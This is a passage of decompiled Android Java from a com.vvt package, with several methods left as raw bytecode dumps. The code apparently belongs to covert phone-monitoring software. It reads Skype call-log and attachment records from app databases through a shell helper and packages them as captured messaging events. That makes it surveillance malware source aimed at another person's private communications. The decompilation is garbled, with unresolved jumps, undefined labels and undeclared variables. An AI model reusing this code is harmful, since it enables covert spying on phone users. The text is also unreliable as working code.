      if (bool1) {}
      label248:
      label251:
      boolean bool4;
      long l2;
      Object localObject7;
      String str;
      label668:
      label688:
      label708:
      Object localObject3;
      for (localObject1 = localb;; localObject1 = localb)
      {
        return (b)localObject1;
        bool2 = a;
        if (!bool2) {
          break;
        }
        break;
        localObject2 = g.b(paramString2);
        bool4 = a;
        if (bool4) {}
        bool4 = com.vvt.ag.b.a(paramString2);
        if (bool4) {
          break label234;
        }
        if (paramSQLiteDatabase2 == null) {
          break label1078;
        }
        try
        {
          localObject4 = ICallLogData.Direction.IN;
          if (paramDirection != localObject4) {
            break label708;
          }
          localObject4 = new java/lang/StringBuilder;
          ((StringBuilder)localObject4).<init>();
          localObject6 = "u";
          localObject4 = ((StringBuilder)localObject4).append((String)localObject6);
          localObject2 = ((StringBuilder)localObject4).append((String)localObject2);
          localObject2 = ((StringBuilder)localObject2).toString();
          l2 = b(paramSQLiteDatabase2, (String)localObject2, paramBoolean);
          bool2 = a;
          if (bool2) {}
          long l3 = 0L;
          bool2 = l2 < l3;
          if (!bool2) {
            break label688;
          }
          int i = 99;
          bool3 = a(i, paramb, l2);
          boolean bool6 = a;
          if ((!bool6) || (!bool3))
          {
            bool3 = false;
            localObject2 = null;
            localb.b = false;
            localObject1 = localb;
            break label248;
          }
          localObject2 = com.vvt.n.a.e.b.c(paramString3);
          localObject4 = a((String)localObject2, paramDirection, l2, paramBoolean);
          if (localObject4 == null) {
            break label668;
          }
          localObject6 = "%s/%s";
          m = 2;
          localObject7 = new Object[m];
          bool7 = false;
          str = null;
          localObject7[0] = localObject2;
          bool3 = true;
          str = ((com.vvt.io.c)localObject4).b;
          localObject7[bool3] = str;
          localObject2 = String.format((String)localObject6, (Object[])localObject7);
          localObject6 = ImType.SKYPE;
          localObject7 = ImMediaFileType.ATTACHMENT;
          str = paramb.f();
          localObject2 = g.a(paramString1, (String)localObject2, (ImType)localObject6, (ImMediaFileType)localObject7, str);
          localObject6 = new java/util/ArrayList;
          ((ArrayList)localObject6).<init>();
          localObject7 = new com/vvt/im/events/info/a;
          ((com.vvt.im.events.info.a)localObject7).<init>();
          str = ((com.vvt.io.c)localObject4).b;
          ((com.vvt.im.events.info.a)localObject7).a(str);
          ((com.vvt.im.events.info.a)localObject7).c((String)localObject2);
          localObject4 = ((com.vvt.io.c)localObject4).b;
          localObject2 = a((String)localObject4, (String)localObject2);
          bool4 = a;
          if (bool4) {}
          ((com.vvt.im.events.info.a)localObject7).b((String)localObject2);
          ((ArrayList)localObject6).add(localObject7);
          paramc.a((List)localObject6);
          bool3 = false;
          localObject2 = null;
          localb.a = null;
        }
        catch (Exception localException)
        {
          bool3 = c;
          if (bool3) {}
          localb.a = ((String)localObject1);
        }
        break label234;
        bool3 = a;
        if (bool3) {}
        localb.a = ((String)localObject1);
        break label234;
        bool3 = a;
        if (bool3) {}
        localb.a = ((String)localObject1);
        break label234;
        localObject3 = a(paramSQLiteDatabase2, paramBoolean);
        bool4 = com.vvt.ag.b.a((String)localObject3);
        if (bool4) {
          break label1058;
        }
        localObject4 = com.vvt.n.a.e.b.c(paramString3);
        localObject3 = a((String)localObject4, paramDirection, (String)localObject3, paramBoolean);
        if (localObject3 == null) {
          break label1038;
        }
        localObject6 = "%s/%s";
        int m = 2;
        localObject7 = new Object[m];
        boolean bool7 = false;
        str = null;
        localObject7[0] = localObject4;
        bool4 = true;
        str = ((com.vvt.io.c)localObject3).b;
        localObject7[bool4] = str;
        localObject7 = String.format((String)localObject6, (Object[])localObject7);
        try
        {
          localObject4 = ((com.vvt.io.c)localObject3).e;
          l2 = Long.parseLong((String)localObject4);
        }
        catch (NumberFormatException localNumberFormatException)
        {
          for (;;)
          {
            int n;
            localObject5 = new java/io/File;
            ((File)localObject5).<init>((String)localObject7);
            l2 = ((File)localObject5).length();
          }
          Object localObject5 = ImType.SKYPE;
          localObject6 = ImMediaFileType.ATTACHMENT;
          str = paramb.f();
          localObject5 = g.a(paramString1, (String)localObject7, (ImType)localObject5, (ImMediaFileType)localObject6, str);
          localObject6 = new java/util/ArrayList;
          ((ArrayList)localObject6).<init>();
          localObject7 = new com/vvt/im/events/info/a;
          ((com.vvt.im.events.info.a)localObject7).<init>();
          str = ((com.vvt.io.c)localObject3).b;
          ((com.vvt.im.events.info.a)localObject7).a(str);
          ((com.vvt.im.events.info.a)localObject7).c((String)localObject5);
          localObject3 = ((com.vvt.io.c)localObject3).b;
          localObject3 = a((String)localObject3, (String)localObject5);
          bool4 = a;
          if (!bool4) {
            break label1002;
          }
          ((com.vvt.im.events.info.a)localObject7).b((String)localObject3);
          ((ArrayList)localObject6).add(localObject7);
          paramc.a((List)localObject6);
          bool3 = false;
          localObject3 = null;
          localb.a = null;
        }
        bool7 = a;
        if (bool7) {}
        n = 99;
        bool4 = a(n, paramb, l2);
        bool5 = a;
        if ((bool5) && (bool4)) {
          break label904;
        }
        bool3 = false;
        localObject3 = null;
        localb.b = false;
      }
      label904:
      label1002:
      continue;
      label1038:
      boolean bool3 = a;
      if (bool3) {}
      localb.a = ((String)localObject1);
      continue;
      label1058:
      bool3 = a;
      if (bool3) {}
      localb.a = ((String)localObject1);
      continue;
      label1078:
      bool3 = a;
      if (bool3) {}
      localb.a = ((String)localObject1);
      continue;
      label1098:
      bool3 = a;
      if (bool3) {}
      localb.a = ((String)localObject1);
    }
  }
  
  public static com.vvt.im.events.info.d a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2)
  {
    com.vvt.im.events.info.d locald = new com/vvt/im/events/info/d;
    locald.<init>();
    localObject1 = null;
    try
    {
      Object localObject2 = e();
      boolean bool1 = false;
      Object localObject4 = null;
      localObject4 = new String[0];
      localObject1 = paramSQLiteDatabase.rawQuery((String)localObject2, (String[])localObject4);
      boolean bool2;
      int i;
      boolean bool3;
      if ((localObject1 == null) || (localObject3 != null)) {
        ((Cursor)localObject3).close();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException = localException;
        bool3 = c;
        if ((bool3) && (localObject1 == null)) {}
      }
    }
    finally
    {
      bool3 = false;
      localObject3 = null;
      localObject1 = localObject5;
    }
    throw ((Throwable)localObject1);
  }
  
  /* Error */
  private static com.vvt.io.c a(String paramString, ICallLogData.Direction paramDirection, long paramLong, boolean paramBoolean)
  {
    // Byte code:
    //   0: getstatic 17	com/vvt/capture/e/d:a	Z
    //   3: istore 5
    //   5: iload 5
    //   7: ifeq +3 -> 10
    //   10: aconst_null
    //   11: astore 6
    //   13: iconst_0
    //   14: istore 7
    //   16: aconst_null
    //   17: astore 8
    //   19: iconst_0
    //   20: istore 5
    //   22: aconst_null
    //   23: astore 9
    //   25: lconst_0
    //   26: lstore 10
    //   28: invokestatic 418	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   31: astore 12
    //   33: aconst_null
    //   34: astore 6
    //   36: lload 10
    //   38: lstore 13
    //   40: bipush 10
    //   42: i2l
    //   43: lstore 15
    //   45: lload 13
    //   47: lload 15
    //   49: lcmp
    //   50: istore 7
    //   52: iload 7
    //   54: ifge +201 -> 255
    //   57: iconst_1
    //   58: istore 7
    //   60: iload 7
    //   62: istore 17
    //   64: iload 4
    //   66: ifne +204 -> 270
    //   69: iconst_1
    //   70: istore 7
    //   72: iload 7
    //   74: iload 17
    //   76: iand
    //   77: istore 7
    //   79: iload 7
    //   81: ifeq +337 -> 418
    //   84: ldc_w 422
    //   87: astore 8
    //   89: iconst_2
    //   90: istore 17
    //   92: iload 17
    //   94: anewarray 4	java/lang/Object
    //   97: astore 18
    //   99: iconst_0
    //   100: istore 19
    //   102: aconst_null
    //   103: astore 20
    //   105: ldc_w 424
    //   108: astore 21
    //   110: aload 18
    //   112: iconst_0
    //   113: aload 21
    //   115: aastore
    //   116: iconst_1
    //   117: istore 19
    //   119: aload 18
    //   121: iload 19
    //   123: aload_0
    //   124: aastore
    //   125: aload 8
    //   127: aload 18
    //   129: invokestatic 267	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   132: astore 8
    //   134: aload 12
    //   136: aload 8
    //   138: invokevirtual 425	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   141: astore 18
    //   143: new 427	java/io/BufferedReader
    //   146: astore 8
    //   148: new 429	java/io/StringReader
    //   151: astore 20
    //   153: aload 20
    //   155: aload 18
    //   157: invokespecial 430	java/io/StringReader:<init>	(Ljava/lang/String;)V
    //   160: aload 8
    //   162: aload 20
    //   164: invokespecial 433	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   167: aload 8
    //   169: invokevirtual 436	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   172: astore 6
    //   174: aload 6
    //   176: ifnull +56 -> 232
    //   179: aload 6
    //   181: invokestatic 441	com/vvt/io/removeFromPath:a	(Ljava/lang/String;)Lcom/vvt/io/MyUncaughtExceptionHandler;
    //   184: astore 6
    //   186: aload 6
    //   188: ifnull -21 -> 167
    //   191: aload 6
    //   193: getfield 445	com/vvt/io/MyUncaughtExceptionHandler:j	I
    //   196: istore 17
    //   198: iload 17
    //   200: ifne -33 -> 167
    //   203: aload 6
    //   205: getfield 369	com/vvt/io/MyUncaughtExceptionHandler:e	Ljava/lang/String;
    //   208: astore 18
    //   210: aload 18
    //   212: invokestatic 372	java/lang/Long:parseLong	(Ljava/lang/String;)J
    //   215: lstore 15
    //   217: lload_2
    //   218: lload 15
    //   220: lcmp
    //   221: istore 17
    //   223: iload 17
    //   225: ifne -58 -> 167
    //   228: aload 6
    //   230: astore 9
    //   232: aload 9
    //   234: ifnull +45 -> 279
    //   237: aload 8
    //   239: invokestatic 448	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   242: aload 12
    //   244: ifnull +8 -> 252
    //   247: aload 12
    //   249: invokevirtual 450	com/vvt/shell/f:d	()V
    //   252: aload 9
    //   254: areturn
    //   255: iconst_0
    //   256: istore 7
    //   258: aconst_null
    //   259: astore 8
    //   261: iconst_0
    //   262: istore 17
    //   264: aconst_null
    //   265: astore 18
    //   267: goto -203 -> 64
    //   270: iconst_0
    //   271: istore 7
    //   273: aconst_null
    //   274: astore 8
    //   276: goto -204 -> 72
    //   279: ldc2_w 198
    //   282: lstore 15
    //   284: lload 15
    //   286: invokestatic 100	android/os/SystemClock:sleep	(J)V
    //   289: lconst_1
    //   290: lstore 15
    //   292: lload 13
    //   294: lload 15
    //   296: ladd
    //   297: lstore 10
    //   299: aload 8
    //   301: astore 6
    //   303: lload 10
    //   305: lstore 13
    //   307: goto -267 -> 40
    //   310: astore 12
    //   312: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   315: istore 22
    //   317: iload 22
    //   319: ifeq +3 -> 322
    //   322: aload 8
    //   324: invokestatic 448	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   327: aload 6
    //   329: ifnull -77 -> 252
    //   332: aload 6
    //   334: invokevirtual 450	com/vvt/shell/f:d	()V
    //   337: goto -85 -> 252
    //   340: astore 9
    //   342: iconst_0
    //   343: istore 22
    //   345: aconst_null
    //   346: astore 12
    //   348: aconst_null
    //   349: astore 6
    //   351: aload 6
    //   353: invokestatic 448	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   356: aload 12
    //   358: ifnull +8 -> 366
    //   361: aload 12
    //   363: invokevirtual 450	com/vvt/shell/f:d	()V
    //   366: aload 9
    //   368: athrow
    //   369: astore 9
    //   371: aload 8
    //   373: astore 6
    //   375: goto -24 -> 351
    //   378: astore 9
    //   380: goto -29 -> 351
    //   383: astore 9
    //   385: aload 6
    //   387: astore 12
    //   389: aload 8
    //   391: astore 6
    //   393: goto -42 -> 351
    //   396: astore 6
    //   398: aload 12
    //   400: astore 6
    //   402: goto -90 -> 312
    //   405: astore 8
    //   407: aload 6
    //   409: astore 8
    //   411: aload 12
    //   413: astore 6
    //   415: goto -103 -> 312
    //   418: aload 6
    //   420: astore 8
    //   422: goto -185 -> 237
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	425	0	paramString	String
    //   0	425	1	paramDirection	ICallLogData.Direction
    //   0	425	2	paramLong	long
    //   0	425	4	paramBoolean	boolean
    //   3	18	5	bool1	boolean
    //   11	381	6	localObject1	Object
    //   396	1	6	localException1	Exception
    //   400	19	6	localObject2	Object
    //   14	258	7	bool2	boolean
    //   17	373	8	localObject3	Object
    //   405	1	8	localException2	Exception
    //   409	12	8	localObject4	Object
    //   23	230	9	localObject5	Object
    //   340	27	9	localObject6	Object
    //   369	1	9	localObject7	Object
    //   378	1	9	localObject8	Object
    //   383	1	9	localObject9	Object
    //   26	278	10	l1	long
    //   31	217	12	localf	com.vvt.shell.f
    //   310	1	12	localException3	Exception
    //   346	66	12	localObject10	Object
    //   38	268	13	l2	long
    //   43	252	15	l3	long
    //   62	15	17	bool3	boolean
    //   90	109	17	i	int
    //   221	42	17	bool4	boolean
    //   97	169	18	localObject11	Object
    //   100	22	19	j	int
    //   103	60	20	localStringReader	java.io.StringReader
    //   108	6	21	str	String
    //   315	29	22	bool5	boolean
    // Exception table:
    //   from	to	target	type
    //   28	31	310	java/lang/Exception
    //   28	31	340	finally
    //   167	172	369	finally
    //   179	184	369	finally
    //   191	196	369	finally
    //   203	208	369	finally
    //   210	215	369	finally
    //   284	289	369	finally
    //   92	97	378	finally
    //   113	116	378	finally
    //   123	125	378	finally
    //   127	132	378	finally
    //   136	141	378	finally
    //   143	146	378	finally
    //   148	151	378	finally
    //   155	160	378	finally
    //   162	167	378	finally
    //   312	315	383	finally
    //   167	172	396	java/lang/Exception
    //   179	184	396	java/lang/Exception
    //   191	196	396	java/lang/Exception
    //   203	208	396	java/lang/Exception
    //   210	215	396	java/lang/Exception
    //   284	289	396	java/lang/Exception
    //   92	97	405	java/lang/Exception
    //   113	116	405	java/lang/Exception
    //   123	125	405	java/lang/Exception
    //   127	132	405	java/lang/Exception
    //   136	141	405	java/lang/Exception
    //   143	146	405	java/lang/Exception
    //   148	151	405	java/lang/Exception
    //   155	160	405	java/lang/Exception
    //   162	167	405	java/lang/Exception
  }
  
  /* Error */
  private static com.vvt.io.c a(String paramString1, ICallLogData.Direction paramDirection, String paramString2, boolean paramBoolean)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 4
    //   3: getstatic 17	com/vvt/capture/e/d:a	Z
    //   6: istore 5
    //   8: iload 5
    //   10: ifeq +3 -> 13
    //   13: lconst_0
    //   14: lstore 6
    //   16: invokestatic 418	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   19: astore 8
    //   21: lload 6
    //   23: lstore 9
    //   25: iconst_0
    //   26: istore 11
    //   28: aconst_null
    //   29: astore 12
    //   31: bipush 10
    //   33: i2l
    //   34: lstore 13
    //   36: lload 9
    //   38: lload 13
    //   40: lcmp
    //   41: istore 5
    //   43: iload 5
    //   45: ifge +351 -> 396
    //   48: ldc_w 422
    //   51: astore 15
    //   53: iconst_2
    //   54: istore 16
    //   56: iload 16
    //   58: anewarray 4	java/lang/Object
    //   61: astore 17
    //   63: iconst_0
    //   64: istore 18
    //   66: aconst_null
    //   67: astore 19
    //   69: ldc_w 424
    //   72: astore 20
    //   74: aload 17
    //   76: iconst_0
    //   77: aload 20
    //   79: aastore
    //   80: iconst_1
    //   81: istore 18
    //   83: aload 17
    //   85: iload 18
    //   87: aload_0
    //   88: aastore
    //   89: aload 15
    //   91: aload 17
    //   93: invokestatic 267	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   96: astore 15
    //   98: aload 8
    //   100: aload 15
    //   102: invokevirtual 425	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   105: astore 17
    //   107: new 427	java/io/BufferedReader
    //   110: astore 15
    //   112: new 429	java/io/StringReader
    //   115: astore 19
    //   117: aload 19
    //   119: aload 17
    //   121: invokespecial 430	java/io/StringReader:<init>	(Ljava/lang/String;)V
    //   124: aload 15
    //   126: aload 19
    //   128: invokespecial 433	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   131: aload 15
    //   133: invokevirtual 436	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   136: astore 12
    //   138: aload 12
    //   140: ifnull +62 -> 202
    //   143: aload 12
    //   145: invokestatic 441	com/vvt/io/removeFromPath:a	(Ljava/lang/String;)Lcom/vvt/io/MyUncaughtExceptionHandler;
    //   148: astore 12
    //   150: aload 12
    //   152: ifnull -21 -> 131
    //   155: aload 12
    //   157: getfield 445	com/vvt/io/MyUncaughtExceptionHandler:j	I
    //   160: istore 16
    //   162: iload 16
    //   164: ifne -33 -> 131
    //   167: getstatic 455	com/vvt/im/events/info/ICallLogData$Direction:OUT	Lcom/vvt/im/events/info/ICallLogData$Direction;
    //   170: astore 17
    //   172: aload_1
    //   173: aload 17
    //   175: if_acmpne -44 -> 131
    //   178: aload 12
    //   180: getfield 263	com/vvt/io/MyUncaughtExceptionHandler:removeFromPath	Ljava/lang/String;
    //   183: astore 17
    //   185: aload 17
    //   187: aload_2
    //   188: invokevirtual 193	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   191: istore 16
    //   193: iload 16
    //   195: ifeq -64 -> 131
    //   198: aload 12
    //   200: astore 4
    //   202: aload 4
    //   204: ifnull +21 -> 225
    //   207: aload 15
    //   209: invokestatic 448	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   212: aload 8
    //   214: ifnull +8 -> 222
    //   217: aload 8
    //   219: invokevirtual 450	com/vvt/shell/f:d	()V
    //   222: aload 4
    //   224: areturn
    //   225: iload_3
    //   226: ifeq +16 -> 242
    //   229: getstatic 17	com/vvt/capture/e/d:a	Z
    //   232: istore 11
    //   234: iload 11
    //   236: ifeq -29 -> 207
    //   239: goto -32 -> 207
    //   242: ldc2_w 198
    //   245: lstore 13
    //   247: lload 13
    //   249: invokestatic 100	android/os/SystemClock:sleep	(J)V
    //   252: lconst_1
    //   253: lstore 13
    //   255: lload 9
    //   257: lload 13
    //   259: ladd
    //   260: lstore 9
    //   262: aload 15
    //   264: astore 12
    //   266: goto -235 -> 31
    //   269: astore 15
    //   271: iconst_0
    //   272: istore 5
    //   274: aconst_null
    //   275: astore 15
    //   277: iconst_0
    //   278: istore 11
    //   280: aconst_null
    //   281: astore 12
    //   283: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   286: istore 21
    //   288: iload 21
    //   290: ifeq +3 -> 293
    //   293: aload 15
    //   295: invokestatic 448	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   298: aload 12
    //   300: ifnull -78 -> 222
    //   303: aload 12
    //   305: invokevirtual 450	com/vvt/shell/f:d	()V
    //   308: goto -86 -> 222
    //   311: astore 15
    //   313: iconst_0
    //   314: istore 11
    //   316: aconst_null
    //   317: astore 12
    //   319: iconst_0
    //   320: istore 21
    //   322: aconst_null
    //   323: astore 8
    //   325: aload 15
    //   327: astore 4
    //   329: aload 12
    //   331: invokestatic 448	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   334: aload 8
    //   336: ifnull +8 -> 344
    //   339: aload 8
    //   341: invokevirtual 450	com/vvt/shell/f:d	()V
    //   344: aload 4
    //   346: athrow
    //   347: astore 4
    //   349: aload 15
    //   351: astore 12
    //   353: goto -24 -> 329
    //   356: astore 4
    //   358: goto -29 -> 329
    //   361: astore 4
    //   363: aload 12
    //   365: astore 8
    //   367: aload 15
    //   369: astore 12
    //   371: goto -42 -> 329
    //   374: astore 12
    //   376: aload 8
    //   378: astore 12
    //   380: goto -97 -> 283
    //   383: astore 15
    //   385: aload 12
    //   387: astore 15
    //   389: aload 8
    //   391: astore 12
    //   393: goto -110 -> 283
    //   396: aload 12
    //   398: astore 15
    //   400: goto -193 -> 207
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	403	0	paramString1	String
    //   0	403	1	paramDirection	ICallLogData.Direction
    //   0	403	2	paramString2	String
    //   0	403	3	paramBoolean	boolean
    //   1	344	4	localObject1	Object
    //   347	1	4	localObject2	Object
    //   356	1	4	localObject3	Object
    //   361	1	4	localObject4	Object
    //   6	267	5	bool1	boolean
    //   14	8	6	l1	long
    //   19	371	8	localObject5	Object
    //   23	238	9	l2	long
    //   26	289	11	bool2	boolean
    //   29	341	12	localObject6	Object
    //   374	1	12	localException1	Exception
    //   378	19	12	localObject7	Object
    //   34	224	13	l3	long
    //   51	212	15	localObject8	Object
    //   269	1	15	localException2	Exception
    //   275	19	15	localBufferedReader	java.io.BufferedReader
    //   311	57	15	localObject9	Object
    //   383	1	15	localException3	Exception
    //   387	12	15	localObject10	Object
    //   54	109	16	i	int
    //   191	3	16	bool3	boolean
    //   61	125	17	localObject11	Object
    //   64	22	18	j	int
    //   67	60	19	localStringReader	java.io.StringReader
    //   72	6	20	str	String
    //   286	35	21	bool4	boolean
    // Exception table:
    //   from	to	target	type
    //   16	19	269	java/lang/Exception
    //   16	19	311	finally
    //   131	136	347	finally
    //   143	148	347	finally
    //   155	160	347	finally
    //   167	170	347	finally
    //   178	183	347	finally
    //   187	191	347	finally
    //   229	232	347	finally
    //   247	252	347	finally
    //   56	61	356	finally
    //   77	80	356	finally
    //   87	89	356	finally
    //   91	96	356	finally
    //   100	105	356	finally
    //   107	110	356	finally
    //   112	115	356	finally
    //   119	124	356	finally
    //   126	131	356	finally
    //   283	286	361	finally
    //   131	136	374	java/lang/Exception
    //   143	148	374	java/lang/Exception
    //   155	160	374	java/lang/Exception
    //   167	170	374	java/lang/Exception
    //   178	183	374	java/lang/Exception
    //   187	191	374	java/lang/Exception
    //   229	232	374	java/lang/Exception
    //   247	252	374	java/lang/Exception
    //   56	61	383	java/lang/Exception
    //   77	80	383	java/lang/Exception
    //   87	89	383	java/lang/Exception
    //   91	96	383	java/lang/Exception
    //   100	105	383	java/lang/Exception
    //   107	110	383	java/lang/Exception
    //   112	115	383	java/lang/Exception
    //   119	124	383	java/lang/Exception
    //   126	131	383	java/lang/Exception
  }
  
  /* Error */
  private static String a(SQLiteDatabase paramSQLiteDatabase, int paramInt, String paramString)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_3
    //   2: aconst_null
    //   3: astore 4
    //   5: iload_3
    //   6: anewarray 4	java/lang/Object
    //   9: astore 5
    //   11: ldc 55
    //   13: astore 6
    //   15: aload 5
    //   17: iconst_0
    //   18: aload 6
    //   20: aastore
    //   21: ldc_w 457
    //   24: aload 5
    //   26: invokestatic 267	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   29: astore 7
    //   31: iload_3
    //   32: anewarray 182	java/lang/String
    //   35: astore 8
    //   37: new 125	java/lang/StringBuilder
    //   40: astore 9
    //   42: aload 9
    //   44: invokespecial 126	java/lang/StringBuilder:<init>	()V
    //   47: aload 9
    //   49: iload_1
    //   50: invokevirtual 460	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   53: astore 9
    //   55: ldc_w 462
    //   58: astore 5
    //   60: aload 9
    //   62: aload 5
    //   64: invokevirtual 130	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   67: invokevirtual 139	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   70: astore 9
    //   72: aload 8
    //   74: iconst_0
    //   75: aload 9
    //   77: aastore
    //   78: aload_0
    //   79: ifnull +178 -> 257
    //   82: ldc 39
    //   84: astore 5
    //   86: aconst_null
    //   87: astore 6
    //   89: aload_0
    //   90: astore 9
    //   92: aload_0
    //   93: aload 5
    //   95: aconst_null
    //   96: aload 7
    //   98: aload 8
    //   100: aconst_null
    //   101: aconst_null
    //   102: aconst_null
    //   103: invokevirtual 465	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   106: astore 9
    //   108: aload 9
    //   110: ifnull +133 -> 243
    //   113: aload 9
    //   115: invokeinterface 53 1 0
    //   120: istore 10
    //   122: iload 10
    //   124: ifeq +119 -> 243
    //   127: aload 9
    //   129: aload_2
    //   130: invokeinterface 59 2 0
    //   135: istore 10
    //   137: aload 9
    //   139: iload 10
    //   141: invokeinterface 389 2 0
    //   146: astore 4
    //   148: aload 9
    //   150: astore 11
    //   152: aload 4
    //   154: astore 9
    //   156: aload 11
    //   158: astore 4
    //   160: aload 4
    //   162: ifnull +10 -> 172
    //   165: aload 4
    //   167: invokeinterface 66 1 0
    //   172: aload 9
    //   174: areturn
    //   175: astore 9
    //   177: aconst_null
    //   178: astore 9
    //   180: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   183: istore 10
    //   185: iload 10
    //   187: ifeq +3 -> 190
    //   190: aload 9
    //   192: ifnull +10 -> 202
    //   195: aload 9
    //   197: invokeinterface 66 1 0
    //   202: aconst_null
    //   203: astore 9
    //   205: goto -33 -> 172
    //   208: astore 9
    //   210: aload 4
    //   212: ifnull +10 -> 222
    //   215: aload 4
    //   217: invokeinterface 66 1 0
    //   222: aload 9
    //   224: athrow
    //   225: astore 5
    //   227: aload 9
    //   229: astore 4
    //   231: aload 5
    //   233: astore 9
    //   235: goto -25 -> 210
    //   238: astore 5
    //   240: goto -60 -> 180
    //   243: aload 9
    //   245: astore 11
    //   247: aconst_null
    //   248: astore 9
    //   250: aload 11
    //   252: astore 4
    //   254: goto -94 -> 160
    //   257: aconst_null
    //   258: astore 9
    //   260: goto -100 -> 160
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	263	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	263	1	paramInt	int
    //   0	263	2	paramString	String
    //   1	31	3	i	int
    //   3	250	4	localObject1	Object
    //   9	85	5	localObject2	Object
    //   225	7	5	localObject3	Object
    //   238	1	5	localException1	Exception
    //   13	75	6	str1	String
    //   29	68	7	str2	String
    //   35	64	8	arrayOfString	String[]
    //   40	133	9	localObject4	Object
    //   175	1	9	localException2	Exception
    //   178	26	9	localObject5	Object
    //   208	20	9	localObject6	Object
    //   233	26	9	localObject7	Object
    //   120	3	10	bool1	boolean
    //   135	5	10	j	int
    //   183	3	10	bool2	boolean
    //   150	101	11	localObject8	Object
    // Exception table:
    //   from	to	target	type
    //   102	106	175	java/lang/Exception
    //   102	106	208	finally
    //   113	120	225	finally
    //   129	135	225	finally
    //   139	146	225	finally
    //   180	183	225	finally
    //   113	120	238	java/lang/Exception
    //   129	135	238	java/lang/Exception
    //   139	146	238	java/lang/Exception
  }
  
  private static String a(SQLiteDatabase paramSQLiteDatabase, int paramInt1, String paramString, int paramInt2)
  {
    String str = null;
    int i = 0;
    while (str == null)
    {
      int j = paramInt2 * 10;
      if (i >= j) {
        break;
      }
      str = a(paramSQLiteDatabase, paramInt1, paramString);
      long l = 6000L;
      SystemClock.sleep(l);
      boolean bool = a;
      if (bool) {}
      i += 1;
    }
    return str;
  }
  
  /* Error */
  private static String a(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: new 125	java/lang/StringBuilder
    //   3: astore_2
    //   4: aload_2
    //   5: invokespecial 126	java/lang/StringBuilder:<init>	()V
    //   8: ldc_w 467
    //   11: astore_3
    //   12: aconst_null
    //   13: astore 4
    //   15: iconst_1
    //   16: istore 5
    //   18: iload 5
    //   20: anewarray 182	java/lang/String
    //   23: astore 6
    //   25: aload 6
    //   27: iconst_0
    //   28: aload_1
    //   29: aastore
    //   30: aload_0
    //   31: aload_3
    //   32: aload 6
    //   34: invokevirtual 383	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   37: astore 4
    //   39: aload 4
    //   41: ifnull +114 -> 155
    //   44: aload 4
    //   46: invokeinterface 53 1 0
    //   51: istore 7
    //   53: iload 7
    //   55: ifeq +100 -> 155
    //   58: ldc_w 469
    //   61: astore_3
    //   62: aload 4
    //   64: aload_3
    //   65: invokeinterface 59 2 0
    //   70: istore 7
    //   72: aload 4
    //   74: iload 7
    //   76: invokeinterface 389 2 0
    //   81: astore_3
    //   82: aload_2
    //   83: aload_3
    //   84: invokevirtual 130	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   87: astore_3
    //   88: ldc_w 471
    //   91: astore 6
    //   93: aload_3
    //   94: aload 6
    //   96: invokevirtual 130	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   99: pop
    //   100: goto -56 -> 44
    //   103: astore_3
    //   104: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   107: istore 7
    //   109: iload 7
    //   111: ifeq +3 -> 114
    //   114: aload 4
    //   116: ifnull +10 -> 126
    //   119: aload 4
    //   121: invokeinterface 66 1 0
    //   126: aload_2
    //   127: invokevirtual 139	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   130: invokevirtual 474	java/lang/String:trim	()Ljava/lang/String;
    //   133: areturn
    //   134: astore 8
    //   136: aconst_null
    //   137: astore_2
    //   138: aload 8
    //   140: astore 4
    //   142: aload_2
    //   143: ifnull +9 -> 152
    //   146: aload_2
    //   147: invokeinterface 66 1 0
    //   152: aload 4
    //   154: athrow
    //   155: aload 4
    //   157: ifnull -31 -> 126
    //   160: goto -41 -> 119
    //   163: astore 8
    //   165: aload 4
    //   167: astore_2
    //   168: aload 8
    //   170: astore 4
    //   172: goto -30 -> 142
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	175	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	175	1	paramString	String
    //   3	165	2	localObject1	Object
    //   11	83	3	localObject2	Object
    //   103	1	3	localException	Exception
